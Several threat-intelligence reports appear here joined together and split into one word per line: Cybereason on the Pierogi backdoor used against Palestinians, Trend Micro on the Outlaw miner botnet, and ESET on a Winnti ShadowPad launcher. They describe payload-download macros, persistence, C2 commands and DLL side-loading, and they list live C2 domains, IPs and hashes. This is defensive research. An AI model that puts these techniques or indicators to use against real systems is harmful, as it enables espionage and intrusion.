https://drive.google.com/uc?export=download&id=1kbHVkvPIjX49qJ62TBz6drW2YPiiaX2a
.
 
JhoneRAT
:
https://twitter.com/jhone87438316
.
 
New
Cyber
Espionage
Campaigns
Targeting
Palestinians
-
Part
2
:
The
Discovery
of
the
New
,
Mysterious
Pierogi
backdoor
.
 
Since
December
2019
,
the
Cybereason
Nocturnus
team
has
been
investigating
a
campaign
targeting
Palestinian
individuals
and
entities
in
the
Middle
East
,
mostly
within
the
Palestinian
territories
.
 
This
campaign
uses
social
engineering
and
decoy
documents
related
to
geopolitical
affairs
and
relations
between
the
Palestinian
government
,
and
references
Egypt
,
Hezbollah
,
and
Iran
.
 
Part
one
of
this
research
investigates
the
Spark
campaign
,
where
attackers
use
social
engineering
to
infect
victims
,
mainly
from
the
Palestinian
territories
,
with
the
Spark
backdoor
.
 
For
more
information
about
part
one
,
click
here
.
 
During
the
attacks
,
victims
are
infected
with
a
previously
undocumented
backdoor
,
dubbed
Pierogi
by
Cybereason
.
 
This
backdoor
allows
attackers
to
spy
on
targeted
victims
.
 
Cybereason
suspects
that
the
backdoor
may
have
been
obtained
in
underground
communities
rather
than
home-grown
,
as
the
evidence
found
in
the
code
of
the
backdoor
suggests
it
may
have
been
developed
by
Ukranian-speaking
hackers
.
 
The
tactics
,
techniques
,
and
procedures
(
TTPs
)
,
content
,
and
theme
of
the
decoy
documents
,
as
well
as
the
victimology
observed
in
the
campaign
,
resemble
previous
attacks
that
have
targeted
Palestinians
.
 
In
particular
,
these
campaigns
appear
to
be
related
to
attacks
carried
out
by
a
group
called
MoleRATs
(
aka
,
Gaza
Cyber
Gang
,
Moonlight
)
,
an
Arabic-speaking
,
politically
motivated
group
that
has
been
operating
in
the
Middle
East
since
2012
.
 
Cyber
Espionage
with
a
New
Malware
:
The
Cybereason
Nocturnus
team
has
discovered
recent
,
targeted
attacks
in
the
Middle
East
to
deliver
the
Pierogi
backdoor
for
politically-driven
cyber
espionage
.
 
Targeting
Palestinians
:
The
campaigns
seems
to
target
Palestinian
individuals
and
entities
,
likely
related
to
the
Palestinian
government
.
 
Using
Geopolitically-charged
Lure
Content
:
The
attackers
use
specially
crafted
lure
content
to
trick
their
targets
into
opening
malicious
files
that
infect
the
victim
s
machine
with
the
Pierogi
backdoor
.
 
The
decoy
content
of
the
malicious
files
revolves
around
various
political
affairs
in
the
Middle
East
,
specifically
targeting
the
tension
between
Hamas
and
other
entities
in
the
region
.
 
Perpetrated
by
an
Arabic-speaking
APT
,
MoleRATs
:
The
modus-operandi
of
the
attackers
as
well
as
the
social
engineering
decoy
content
seem
aligned
with
previous
attacks
carried
out
by
an
Arabic-speaking
APT
group
called
MoleRATs
(
aka
Gaza
Cybergang
)
.
 
This
group
has
been
operating
in
the
Middle
East
since
2012
.
 
Similar
to
previous
attacks
,
this
campaign
starts
with
social
engineering
.
 
In
one
instance
,
it
lures
victims
to
open
an
email
attachment
.
 
In
others
,
it
persuades
victims
to
download
a
report
about
a
recent
political
affair
pertaining
to
the
Middle
East
and
specifically
to
Palestinian
matters
.
 
In
most
cases
,
the
downloaded
file
is
either
an
executable
that
masquerades
as
a
Microsoft
Word
document
or
a
weaponized
Microsoft
Word
document
.
 
As
soon
as
the
victim
double-clicks
on
the
dropper
,
they
are
presented
with
the
decoy
document
.
 
The
document
lowers
the
victim
s
suspicions
by
distracting
them
with
a
real
document
while
the
dropper
installs
the
backdoor
.
 
However
,
some
of
the
documents
also
play
an
additional
role
in
the
attack
.
 
While
some
are
more
neutral
,
quoting
from
newspapers
and
the
media
,
others
seem
to
report
fake
news
to
spread
misinformation
that
serves
a
political
agenda
.
 
With
regards
to
decoy
content
themes
,
this
campaign
resembles
previous
campaigns
reported
in
blogs
by
Vectra
,
Unit
42
,
and
Talos
.
 
The
contents
of
the
decoy
documents
seems
to
include
:
Potentially
fake
documents
that
appear
to
be
issued
by
the
Palestinian
government
.
 
Meetings
minutes
of
different
Palestinian
organizations
.
 
News
about
Hamas
and
the
Palestinian
National
Authority
.
 
Potentially
fake
,
leaked
Hamas
documents
.
 
Criticism
of
and
embarrassing
content
about
Hamas
.
 
APA
adopted
resolution
Unlimited
support
for
Palestinian
people.docx
:
Describes
a
resolution
by
the
Asian
Parliamentary
Assembly
(
APA
)
held
in
Anatalya
,
announcing
unlimited
support
for
the
Palestinian
people
7b4c736b92ce702fb584845380e237aa55ddb4ef693ea65a766c9d9890b3852c
.
 
jalsa.rar
:
Contains
the
above
mentioned
document
,
as
well
as
photos
of
the
assemblies
and
political
cartoons
criticizing
Hamas
50a597aa557084e938e2a987ec5db99187428091e8141e616cced72e6a39de1b
.
 
Internet
in
government.pdf
/
Define
the
Internet
in
government
institutions.pdf
:
Announcement
about
a
new
regulation
regarding
internet
usage
in
Palestinian
government
institutions
.
 
The
announcement
states
that
porn
,
gambling
and
entertainment
sites
will
be
blocked
9e4464d8dc8a3984561a104a93a7b8d6eb3d622d5187ae1d3fa6f6dafa2231a8
.
 
Congratulations_Jan-7.pdf
:
Letter
allegedly
from
the
Barcelona
branch
of
the
Federation
of
Independent
Palestinian
Communities
and
Organizations
and
Events
in
the
Diaspora
.
 
The
letter
commemorates
the
73rd
anniversary
of
the
Syrian
Army
,
and
expresses
the
Palestinian
support
of
Bashar
Al-Asad
.
 
The
letter
ends
with
Death
to
Israel
and
Humiliation
and
shame
to
the
tyrant
America
65c8b9e9017ac84d90553a252c836c38b6a3902e5ab24d3a4b8a584e2d615fcc
.
 
Daily_Report.docx
:
Daily
summary
of
news
concerning
different
Palestinian
govenment
related
issues
d3771d58051cb0f4435232769ed11c0c0e6457505962ddb6eeb46d900de55428
.
 
Directory
of
Government
Services.pdf
:
A
screenshot
from
a
website
of
the
Palestinian
government
,
showing
a
directory
of
the
different
ministries
9e4464d8dc8a3984561a104a93a7b8d6eb3d622d5187ae1d3fa6f6dafa2231a8
.
 
Meeting
Agenda.pdf
:
Corrupted
file
f6876fd68fdb9c964a573ad04e4e0d3cfd328304659156efc9866844a28c7427
.
 
imgonline-com-ua-dexifEEdWuIbNSv7G.jpg
:
potentially
leaked
Hamas
document
detailing
Hamas
32nd
anniversary
expenses
in
different
regions
in
the
Palestinian
Territories
932ecbc5112abd0ed30231896752ca471ecd0c600b85134631c1d5ffcf5469fb
.
 
Asala.mp3
:
An
.mp3
file
of
a
song
by
the
famous
Syrian
singer
Asala
Nasri
(
song
name
:
Fen
Habibi
,
translation
:
where
is
my
loved
one?
)
4583b49086c7b88cf9d074597b1d65ff33730e1337aee2a87b8745e94539d964
.
 
In
addition
to
the
documents
,
the
content
includes
a
number
of
political
cartoons
that
criticize
Hamas
relations
with
Iran
and
Hamas
standing
as
a
resistance
movement
.
 
While
the
majority
of
infections
in
this
campaign
did
not
originate
from
Malicious
Microsoft
Word
document
,
the
Cybereason
Nocturnus
team
found
several
weaponized
Microsoft
Word
document
with
an
embedded
downloader
macro
that
downloads
and
installs
the
backdoor
used
in
this
attack
.
 
CV
Manal
1
:
Resume
of
a
woman
from
Abu-Dis
,
Palestinian
Authority
4a6d1b686873158a1eb088a2756daf2882bef4f5ffc7af370859b6f87c08840f
.
 
Employee-entitlements-2020.doc
:
A
statement
of
the
Ministry
of
Finance
on
civil
and
military
employee
benefits
and
salaries
,
discussing
the
conterversial
issue
Palestinian
Authority
employees
that
have
not
been
paid
or
paid
in
full
their
salaries
b33f22b967a5be0e886d479d47d6c9d35c6639d2ba2e14ffe42e7d2e5b11ad80
.
 
When
the
victims
open
the
document
,
they
are
encouraged
to
click
on
Enable
Content
,
which
causes
the
embedded
malicious
macro
code
to
run
.
 
The
macro
code
embedded
in
the
document
is
rather
simple
and
is
not
obfuscated
.
 
In
fact
,
it
is
almost
unusual
in
its
unsophistication
.
 
The
macro
code
does
the
following
:
Downloads
a
Base64
encoded
payload
from
the
following
URL
:
http://linda-callaghan.icu/Minkowski/brown
.
 
Writes
the
decoded
payload
to
C:\ProgramData\IntegratedOffice.txt
.
 
Decodes
the
Base64
payload
and
writes
the
file
to
C:\ProgramData\IntegratedOffice.exe
.
 
Runs
the
executable
file
and
deletes
the
.txt
file
.
 
Pierogi
,
the
backdoor
in
this
attack
,
appears
to
be
a
new
backdoor
written
in
Delphi
.
 
It
enables
the
attackers
to
spy
on
victims
using
rather
basic
backdoor
capabilities
.
 
While
it
is
unknown
at
this
point
whether
the
backdoor
was
coded
by
the
same
members
of
the
group
behind
the
attacks
,
there
are
indications
that
suggest
that
the
malware
was
authored
by
Ukranian-speaking
malware
developers
.
 
The
commands
used
to
communicate
with
the
C2
servers
and
other
strings
in
the
binary
are
written
in
Ukrainian
.
 
This
is
why
we
chose
to
name
the
malware
Pierogi
,
after
the
popular
East
European
dish
.
 
The
backdoor
has
the
following
capabilities
:
Collects
information
about
the
infected
machine
.
 
Uploads
files
to
the
attackers
server
.
 
Downloads
additional
payloads
.
 
Takes
screenshots
from
the
infected
machine
.
 
Executes
arbitrary
commands
via
the
CMD
shell
.
 
In
addition
to
spy
features
,
the
backdoor
also
implements
a
few
checks
to
ensure
it
is
running
in
a
safe
environment
.
 
Specifically
,
it
looks
for
antivirus
and
other
security
products
.
 
The
backdoor
queries
Windows
for
installed
antivirus
software
using
WMI
:
SELECT
*
FROM
AntiVirusProduct
It
looks
for
specific
antivirus
and
security
products
installed
on
the
infected
machine
,
such
as
Kaspersky
,
eScan
,
F-secure
and
Bitdefender
.
 
The
backdoor
achieves
persistence
using
a
classic
startup
item
autorun
technique
:
A
shortcut
is
added
to
the
the
startup
folder
:
C:\Users\User\AppData\Roaming\Microsoft\Windows\Start
Menu\Programs\Startup
.
 
Once
the
user
logs
on
to
the
infected
machine
,
the
shortcut
points
to
the
file
binary
location
in
the
C:\ProgramData\
folder
.
 
The
GUID
generated
by
the
malware
is
saved
in
a
file
called
GUID.bin
.
 
This
file
is
created
in
the
same
folder
as
the
binary
of
the
backdoor
(
C:\ProgramData\GUID.bin
)
.
 
The
backdoor
has
rather
basic
C2
functionality
implemented
through
a
predefined
set
of
URLs
:
1
.
 
Sending
machine
information
and
a
heartbeat
to
the
C2
:
URL
:
http://nicoledotson.icu/debby/weatherford/Yortysnr
The
information
sent
to
the
C2
includes
:
cname
:
computer
name
,
username
,
and
GUID
.
 
av
:
Name
of
detected
antivirus
.
 
osversion
:
version
of
the
operating
system
.
 
aname
:
the
location
of
the
malware
on
the
infected
machine
.
 
Requesting
commands
from
the
C2
server
:
URL
:
http://nicoledotson.icu/debby/weatherford/Ekspertyza
.
 
Ekspertyza
means
expertise
or
examination
in
Ukranian
.
 
There
are
3
basic
commands
coming
from
the
server
in
the
form
of
MD5
hashes
:
Dfff0a7fa1a55c8c1a4966c19f6da452
:
cmd
.
 
51a7a76a7dd5d9e4651fe3d4c74d16d6
:
downloadfile
.
 
62c92ba585f74ecdbef4c4498a438984
:
screenshot
.
 
Uploading
data
(
mainly
screenshots
)
to
the
C2
:
URL
:
http://nicoledotson.icu/debby/weatherford/Zavantazhyty
.
 
Zavantazhyty
means
to
load
or
download
in
Ukranian
.
 
This
command
is
used
to
upload
collected
data
to
the
C2
server
.
 
For
example
,
in
some
instances
the
backdoor
uploads
screenshots
taken
from
an
infected
machine
,
as
can
be
seen
in
the
example
below
.
 
Removing
information
:
URL
:
http://nicoledotso.icu/debby/weatherford/Vydalyty
.
 
Vydalyty
means
to
remove
or
delete
in
Ukrainian
.
 
The
malware
can
delete
various
requests
based
on
the
command
below
.
 
The
records
of
the
domains
and
IPs
involved
in
this
campaign
seem
to
show
that
the
attackers
created
a
new
infrastructure
specifically
for
this
campaign
.
 
The
domains
were
registered
in
November
2019
and
operationalized
shortly
after
.
 
In
part
two
of
this
research
,
we
examined
the
Pierogi
campaign
.
 
Cybereason
suspects
this
campaign
targets
Palestinian
individuals
and
entities
in
the
Middle
East
,
specifically
directed
at
those
in
the
Palestinian
government
.
 
The
threat
actors
behind
the
campaign
use
social
engineering
to
infect
their
victims
with
the
Pierogi
backdoor
for
cyber
espionage
purposes
.
 
The
threat
actor
behind
the
attack
invested
considerable
time
and
effort
to
lure
their
victims
with
specially-crafted
documents
that
target
Palestinian
individuals
and
entities
in
the
Middle
East
.
 
In
our
analysis
,
we
reviewed
the
TTPs
and
the
decoy
content
,
and
pointed
out
the
similarities
between
previous
attacks
that
have
been
attributed
to
MoleRATs
,
an
Arabic-speaking
,
politically
motivated
group
that
has
operated
in
the
Middle
East
since
2012
.
 
The
Pierogi
backdoor
discovered
by
Cybereason
during
this
investigation
seems
to
be
undocumented
and
gives
the
threat
actors
espionage
capabilities
over
their
victims
.
 
Based
on
the
Ukranian
language
embedded
in
the
backdoor
,
Cybereason
raises
the
possibility
that
the
backdoor
was
obtained
in
underground
communities
by
the
threat
actors
,
rather
than
developed
in-house
by
the
group
.
 
Outlaw
Updates
Kit
to
Kill
Older
Miner
Versions
,
Targets
More
Systems
.
 
As
we
ve
observed
with
cybercriminal
groups
that
aim
to
maximize
profits
for
every
campaign
,
silence
does
nt
necessarily
mean
inactivity
.
 
It
appears
hacking
group
Outlaw
,
which
has
been
silent
for
the
past
few
months
,
was
simply
developing
their
toolkit
for
illicit
income
sources
.
 
While
they
have
been
quiet
since
our
June
analysis
,
we
observed
an
increase
in
the
group
s
activities
in
December
,
with
updates
on
the
kits
capabilities
reminiscent
of
their
previous
attacks
.
 
The
updates
expanded
scanner
parameters
and
targets
,
looped
execution
of
files
via
error
messages
,
improved
evasion
techniques
for
scanning
activities
,
and
improved
mining
profits
by
killing
off
both
the
competition
and
their
own
previous
miners
.
 
We
analyzed
the
kits
,
which
were
designed
to
steal
information
from
the
automotive
and
finance
industries
,
launch
subsequent
attacks
on
already
compromised
systems
,
and
(
possibly
)
sell
stolen
information
.
 
Comparing
this
development
to
their
previous
attacks
,
we
think
Outlaw
may
be
aiming
to
go
after
enterprises
that
have
yet
to
update
their
systems
,
assessing
security
and
changes
with
their
previously
infected
hosts
,
finding
new
and
old
targets
,
and
possibly
testing
their
updates
in
the
wild
.
 
We
will
continue
to
observe
the
group
s
activities
as
they
target
industries
from
the
United
States
and
Europe
.
 
Based
on
the
samples
we
collected
and
traced
to
456
distinct
IPs
,
we
expect
the
group
to
be
more
active
in
the
coming
months
as
we
observed
changes
on
the
versions
we
acquired
.
 
These
new
samples
targeted
Linux-
and
Unix-based
operating
systems
,
vulnerable
servers
,
and
internet
of
things
(
IoT
)
devices
by
exploiting
known
vulnerabilities
with
available
exploits
.
 
This
time
,
the
group
explored
unpatched
systems
vulnerable
to
CVE-2016-8655
and
Dirty
COW
exploit
(
CVE-2016-5195
)
as
attack
vectors
.
 
Files
using
simple
PHP-based
web
shells
were
also
used
to
attack
systems
with
weak
SSH
and
Telnet
credentials
.
 
While
no
phishing-
or
social
engineering-initiated
routines
were
observed
in
this
campaign
,
we
found
multiple
attacks
over
the
network
that
are
considered
loud.
These
involved
large-scale
scanning
operations
of
IP
ranges
intentionally
launched
from
the
command
and
control
(
C&C
)
server
.
 
The
honeynet
graphs
,
which
show
activity
peaks
associated
with
specific
actions
,
also
suggest
that
the
scans
were
timed
.
 
We
also
considered
the
move
as
an
obfuscation
technique
,
as
it
was
mixed
with
a
lot
of
script
kiddie
activities
that
can
easily
be
mistaken
for
grey
noise
online
.
 
The
attackers
could
hide
their
activities
if
they
noted
the
business
hours
of
the
intended
targets
and
performed
the
actions
coinciding
with
said
times
.
 
From
the
sample
we
analyzed
,
attacks
started
from
one
virtual
private
server
(
VPS
)
that
searches
for
a
vulnerable
machine
to
compromise
(
previous
techniques
used
malicious
URLs
or
infecting
legitimate
websites
for
bot
propagation
)
.
 
Once
infected
,
the
C&C
commands
for
the
infected
system
launches
a
loud
scanning
activity
and
spreads
the
botnet
by
sending
a
whole
kit
of
binary
files
at
once
with
naming
conventions
same
as
the
ones
already
in
the
targeted
host
,
likely
banking
on
breaking
through
via
security
through
obscurity.
They
attempted
to
evade
traffic
inspection
by
encoding
the
code
for
the
scanner
with
base-64
.
 
The
zombie
host
initiates
the
scan
another
routine
from
previous
campaigns
but
updated
with
a
larger
set
of
parameters
and
programmed
to
run
in
the
background
.
 
The
kit
we
found
is
in
tgz
format
,
though
we
have
observed
some
samples
disguised
as
png
or
jpg
.
 
While
previous
routines
took
advantage
of
competing
miners
activities
and
unrelated
components
to
hijack
the
profit
,
the
latest
version
of
the
code
attempts
to
remove
all
related
files
and
codes
from
previous
infections
(
including
their
own
to
make
sure
the
running
components
are
updated
,
as
well
as
those
from
other
cybercriminals
to
maximize
the
resources
of
the
zombie
host
)
and
creates
a
new
working
directory
/tmp/.X19-unix
to
move
the
kit
and
extract
the
files
.
 
The
tsm
binary
then
runs
in
the
background
,
forwarding
a
series
of
error
messages
to
/dev/null
to
keep
the
code
running
,
ensuring
the
continuous
execution
of
the
code
referenced
with
a
set
of
parameters
/tmp/up.txt
.
 
The
script
then
waits
20
minutes
before
it
runs
the
wrapper
script
initall
:
2e2c9d08c7c955f6ce5e27e70b0ec78a888c276d71a72daa0ef9e3e40f019a1a
install
.
 
Another
variant
executes
a
set
of
commands
once
a
system
is
successfully
compromised
.
 
Most
of
these
commands
are
related
to
gathering
information
from
the
infected
machine
(
number
of
CPU
cores
,
users
,
scheduled
tasks
,
running
processes
,
OS
installed
,
and
CPU
and
memory
information
)
via
the
dota3
payload
,
as
well
as
changing
the
password
to
a
random
string
also
stored
in
/tmp/up.txt
.
 
In
a
previous
execution
(
published
in
June
2019
)
,
we
observed
that
dota2
had
its
own
folder
but
it
was
hardly
executed
,
indicating
that
this
version
is
the
updated
iteration
.
 
Running
the
script
removes
the
remaining
files
and
scripts
from
previous
attacks
,
keeping
a
low
profile
to
evade
detection
.
 
If
the
system
has
been
previously
infected
with
a
cryptominer
,
it
also
attempts
to
kill
the
running
miner
and
all
its
related
activities
.
 
Based
on
a
bashtemp
directory
of
the
latest
sample
we
found
,
there
are
other
compiled
ELF
scripts
,
named
init
and
init2
,
that
loops
the
kit
to
keep
running
:
0c458dfe0a2a01ab300c857fdc3373b75fbb8ccfa23d16eff0d6ab888a1a28f6
init
.
 
93ce211a71867017723cd78969aa4cac9d21c3d8f72c96ee3e1b2712c0eea494
init2
.
 
Both
init
and
init2
scripts
make
sure
all
other
running
mining
services
are
killed
,
and
that
all
the
files
in
the
working
directory
are
executed
by
giving
777
permissions
.
 
We
also
found
the
init0
script
running
;
the
script
cleans
out
all
miners
regardless
of
its
origin
.
 
It
then
resets
cron
and
removes
possible
cache
files
from
other
programs
,
starts
scripts
and
binaries
a
,
init0
,
and
start
,
and
sets
the
persistence
by
modifying
the
crontab
.
 
The
a
binary
is
a
script
wrapper
to
start
run
,
a
Perl-obfuscated
script
for
installation
of
a
Shellbot
to
gain
control
of
the
infected
system
.
 
The
Shellbot
disguises
itself
as
a
process
named
rsync
,
commonly
the
binary
seen
on
many
Unix-
and
Linux-based
systems
to
automatically
run
for
backup
and
synchronization
.
 
This
allows
the
malicious
activity
to
evade
detection
.
 
The
Shellbot
script
is
added
to
run
after
the
victim
s
system
reboots
,
and
scripts
/a/upd
,
/b/sync/
,
and
/c/aptitude/
are
added
to
the
crontab
.
 
However
,
while
we
observed
the
presence
of
the
codes
,
the
functions
of
upd
,
sync
and
aptitude
were
disabled
in
the
kits
latest
version
.
 
It
remains
unclear
whether
these
are
leftover
code
from
the
previous
versions
or
their
particular
purposes
were
served
.
 
Shellbot
is
also
used
to
control
the
botnet
,
with
a
command
that
is
sent
and
run
from
the
C&C
to
determine
if
there
is
a
code
execution
in
the
shell
,
the
hostname
,
and
its
architecture
.
 
All
results
and
system
information
collected
from
the
infected
system
are
stored
locally
in
the
device
for
a
period
before
Outlaw
retrieves
them
via
the
C&C
.
 
We
also
found
traces
of
Android
Package
Kits-
(
APK-
)
and
Android
Debug
Bridge
(
ADB
)-based
commands
that
enable
cryptocurrency
mining
activities
in
Android-based
TVs
.
 
Since
discovering
the
operations
of
this
group
in
2018
,
Outlaw
continues
to
use
scripts
,
codes
,
and
commands
that
have
been
previously
used
and
deployed
.
 
These
routines
are
indicative
of
the
group
s
aim
to
get
quantitative
returns
through
varied
cybercriminal
profit
streams
.
 
This
was
also
reinforced
by
their
naming
conventions
,
wherein
different
versions
are
simply
named
after
the
code
iterations
,
following
a
specific
format
regardless
of
the
actual
function
of
the
code
.
 
Furthermore
,
based
on
the
group
s
use
of
dated
exploits
as
vectors
that
companies
would
have
likely
addressed
with
monitoring
and
regular
patching
schedules
,
it
appears
that
they
re
going
after
enterprises
who
have
yet
to
patch
their
systems
,
as
well
as
companies
with
internet-facing
systems
with
weak
to
no
monitoring
of
traffic
and
activities
.
 
Considering
the
amount
of
resources
needed
to
deploy
all
the
necessary
patches
for
an
enterprise
(
such
as
quality
testing
and
operations
alignment
)
,
which
implies
costly
downtime
for
operations
and
the
hesitation
to
update
all
systems
immediately
,
Outlaw
may
find
even
more
targets
and
victims
for
their
updated
botnets
every
time
there
is
a
patch
released
and
waiting
to
be
downloaded
.
 
Save
for
a
few
iteration
updates
,
combinations
from
previous
deployments
,
and
using
the
routines
repetitively
for
every
campaign
,
we
found
very
little
changes
in
the
group
s
toolkit
,
which
allowed
various
honeypots
across
the
Eastern
European
region
to
detect
many
of
the
sent
binaries
.
 
Meanwhile
,
the
group
uses
a
wide
range
of
IP
addresses
as
input
for
scanning
activities
that
are
grouped
by
country
,
allowing
them
to
attack
certain
regions
or
areas
within
particular
periods
of
the
year
,
as
previously
observed
.
 
We
think
the
group
has
likely
become
more
enterprising
,
and
learned
to
take
advantage
of
some
details
from
their
previous
campaigns
to
maximize
profit
opportunities
while
exerting
minimal
effort
.
 
By
shaping
the
attack
,
the
group
may
be
able
to
create
niches
in
the
underground
,
catering
to
the
specific
needs
of
their
customers
.
 
Also
aware
of
the
existing
laws
in
Europe
,
they
can
avoid
prosecution
in
certain
countries
as
long
as
they
avoid
attacking
them
.
 
Collection
of
results
and
data
from
scanning
in
this
manner
might
be
easier
to
sort
(
while
allowing
them
to
stay
under
the
radar
)
,
as
compared
to
getting
feedback
from
zombie
bots
deployed
around
the
world
simultaneously
.
 
We
will
continue
to
monitor
this
hacking
group
s
activities
and
their
toolkit
s
developments
.
 
Outlaw
s
attack
routines
may
not
be
new
,
but
it
still
serves
as
a
reminder
for
enterprises
to
update
their
systems
regularly
.
 
Legacy
system
users
may
use
their
providers
virtual
patches
.
 
Users
are
advised
to
close
unused
ports
,
to
secure
ports
and
other
internet-facing
devices
that
are
regularly
open
for
system
administrators
support
.
 
Users
can
also
adopt
a
multilayered
security
solution
that
can
protect
systems
from
the
gateway
to
the
endpoint
,
actively
blocking
malicious
URLs
by
employing
filtering
,
behavioral
analysis
,
and
custom
sandboxing
.
 
Users
can
consider
adopting
security
solutions
that
can
defend
against
malicious
bot-related
activities
such
as
Outlaw
s
through
a
cross-generational
blend
of
threat
defense
techniques
.
 
Trend
Micro
XGen
security
provides
high-fidelity
machine
learning
that
can
secure
the
gateway
and
endpoints
,
and
protect
physical
,
virtual
,
and
cloud
workloads
.
 
With
technologies
that
employ
web/URL
filtering
,
behavioral
analysis
,
and
custom
sandboxing
,
XGen
security
offers
protection
against
ever-changing
threats
that
bypass
traditional
controls
and
exploit
known
and
unknown
vulnerabilities
.
 
A
multi-layered
connected
network
defense
and
complete
visibility
into
all
network
traffic
,
in
addition
to
next-generation
intrusion
prevention
system
(
NGIPS
)
,
can
help
organizations
stay
a
step
ahead
of
threats
that
could
compromise
intangible
assets
.
 
XGen
security
also
powers
Trend
Micro
s
suite
of
security
solutions
:
Hybrid
Cloud
Security
and
User
Protection
.
 
Outlaw
:
1800de5f0fb7c5ef3c0d9787260ed61bc324d861bc92d9673d4737d1421972aa
Cryptocurrency
miner
Trojan.SH.MALXMR.UWEJP
.
 
Outlaw
:
b68bd3a54622792200b931ee5eebf860acf8b24f4b338b5080193573a81c747d
Shellbot
Backdoor.SH.SHELLBOT.AA
.
 
Outlaw
:
620635aa9685249c87ead1bb0ad25b096714a0073cfd38a615c5eb63c3761976
Tool
Trojan.Linux.SSHBRUTE.B
.
 
Outlaw
:
fc57bd66c27066104cd6f8962cd463a5dfc05fa59b76b6958cddd3542dfe6a9a
Cryptocurrency
miner
Coinminer.Linux.MALXMR.SMDSL32
.
 
Outlaw
:
649280bd4c5168009c1cff30e5e1628bcf300122b49d339e3ea3f3b6ff8f9a79
Cryptocurrency
miner
Coinminer.Linux.MALXMR.SMDSL64
.
 
Outlaw
:
159.203.141.208
.
 
Outlaw
:
104.236.192.6
.
 
Outlaw
:
45.9.148.129:80
Miner
pool
.
 
Outlaw
:
45.9.148.125:80
Miner
pool
.
 
Outlaw
:
http://www.minpop.com/sk12pack/idents.php
Command
and
control
.
 
Outlaw
:
http://www.minpop.com/sk12pack/names.php
Command
and
control
.
 
Winnti
Group
targeting
universities
in
Hong
Kong
.
 
In
November
2019
,
we
discovered
a
new
campaign
run
by
the
Winnti
Group
against
two
Hong
Kong
universities
.
 
We
found
a
new
variant
of
the
ShadowPad
backdoor
,
the
group
s
flagship
backdoor
,
deployed
using
a
new
launcher
and
embedding
numerous
modules
.
 
The
Winnti
malware
was
also
found
at
these
universities
a
few
weeks
prior
to
ShadowPad
.
 
The
Winnti
Group
,
active
since
at
least
2012
,
is
responsible
for
for
high-profile
supply-chain
attacks
against
the
video
game
and
software
industries
leading
to
the
distribution
of
trojanized
software
(
such
as
CCleaner
,
ASUS
LiveUpdate
and
multiple
video
games
)
that
is
then
used
to
compromise
more
victims
.
 
It
is
also
known
for
having
compromised
various
targets
in
the
healthcare
and
education
sectors
.
 
ESET
researchers
recently
published
a
white
paper
updating
our
understanding
of
the
arsenal
of
the
Winnti
Group
,
following
a
blog
post
documenting
a
supply-chain
attack
targeting
the
videogame
industry
in
Asia
.
 
Additionally
,
we
published
a
blog
post
on
a
new
backdoor
named
skip-2.0
that
targets
Microsoft
SQL
Server
.
 
This
article
focuses
on
the
technical
details
of
this
new
ShadowPad
variant
.
 
About
the
Winnti
Group
naming
:
We
have
chosen
to
keep
the
name
Winnti
Group
since
it
s
the
name
first
used
to
identify
it
,
in
2013
,
by
Kaspersky
.
 
Since
Winnti
is
also
a
malware
family
,
we
always
write
Winnti
Group
when
we
refer
to
the
malefactors
behind
the
attacks
.
 
Since
2013
,
it
has
been
demonstrated
that
Winnti
is
only
one
of
the
many
malware
families
used
by
the
Winnti
Group
.
 
In
November
2019
,
ESET
s
machine-learning
engine
,
Augur
,
detected
a
malicious
and
unique
sample
present
on
multiple
computers
belonging
to
two
Hong
Kong
universities
where
the
Winnti
malware
had
already
been
found
at
the
end
of
October
.
 
The
suspicious
sample
detected
by
Augur
is
actually
a
new
32-bit
ShadowPad
launcher
.
 
Samples
from
both
ShadowPad
and
Winnti
found
at
these
universities
contain
campaign
identifiers
and
C&C
URLs
with
the
names
of
the
universities
,
which
indicates
a
targeted
attack
.
 
In
addition
to
the
two
compromised
universities
,
thanks
to
the
C&C
URL
format
used
by
the
attackers
we
have
reasons
to
think
that
at
least
three
additional
Hong
Kong
universities
may
have
been
compromised
using
these
same
ShadowPad
and
Winnti
variants
.
 
This
campaign
of
the
Winnti
Group
against
Hong
Kong
universities
was
taking
place
in
the
context
of
Hong
Kong
facing
civic
protests
that
started
in
June
2019
triggered
by
an
extradition
bill
.
 
Even
though
the
bill
was
withdrawn
in
October
2019
,
protests
continued
,
demanding
full
democracy
and
investigation
of
the
Hong
Kong
police
.
 
These
protests
gathered
hundreds
of
thousands
of
people
in
the
streets
with
large
support
from
students
of
Hong
Kong
universities
,
leading
to
multiple
university
campus
occupations
by
the
protesters
.
 
We
have
contacted
the
compromised
universities
and
provided
the
necessary
information
and
assistance
to
remediate
the
compromise
.
 
Unlike
previous
ShadowPad
variants
documented
in
our
white
paper
on
the
arsenal
of
the
Winnti
Group
,
this
launcher
is
not
obfuscated
using
VMProtect
.
 
Furthermore
,
the
encrypted
payload
is
neither
embedded
in
the
overlay
nor
located
in
a
COM1:NULL.dat
alternate
data
stream
.
 
And
the
usual
RC5
encryption
with
a
key
derived
from
the
volume
ID
of
the
system
drive
of
the
victim
machine
(
as
seen
in
the
PortReuse
backdoor
,
skip-2.0
and
some
ShadowPad
variants
)
is
not
present
either
.
 
In
this
case
,
the
launcher
is
much
simpler
.
 
The
launcher
is
a
32-bit
DLL
named
hpqhvsei.dll
,
which
is
the
name
of
a
legitimate
DLL
loaded
by
hpqhvind.exe
.
 
This
executable
is
from
HP
and
is
usually
installed
with
their
printing
and
scanning
software
called
HP
Digital
Imaging
.
 
In
this
case
the
legitimate
hpqhvind.exe
was
dropped
by
the
attackers
,
along
with
their
malicious
hpqhvsei.dll
,
in
C:\Windows\Temp
.
 
Although
we
do
not
have
the
component
that
dropped
and
executed
this
launcher
,
the
presence
of
these
files
leads
us
to
think
that
the
initial
execution
of
this
launcher
is
done
through
DLL
side-loading
.
 
When
the
malicious
DLL
is
loaded
at
hpqhvind.exe
startup
,
its
DLLMain
function
is
called
that
will
check
its
parent
process
for
the
following
sequence
of
bytes
at
offset
0x10BA
.
 
In
the
case
where
the
parent
process
is
hpqhvind.exe
,
this
sequence
of
bytes
is
present
at
this
exact
location
and
the
malicious
DLL
will
proceed
to
patch
the
parent
process
in
memory
.
 
It
replaces
the
original
instructions
at
0x10BA
with
an
unconditional
jump
(
jmp
0xE9
)
to
the
address
of
the
function
from
hpqhvsei.dll
that
decrypts
and
executes
the
encrypted
payload
embedded
in
the
launcher
.
 
The
decompiled
function
responsible
for
patching
the
parent
process
.
 
In
case
hpqhvsei.dll
is
loaded
by
a
different
process
than
hpqhvind.exe
,
the
malicious
code
will
not
be
decrypted
and
executed
.
 
The
difference
between
the
original
and
patched
hpqhvind.exe
.
 
The
part
of
the
code
that
is
patched
is
located
at
the
very
beginning
of
the
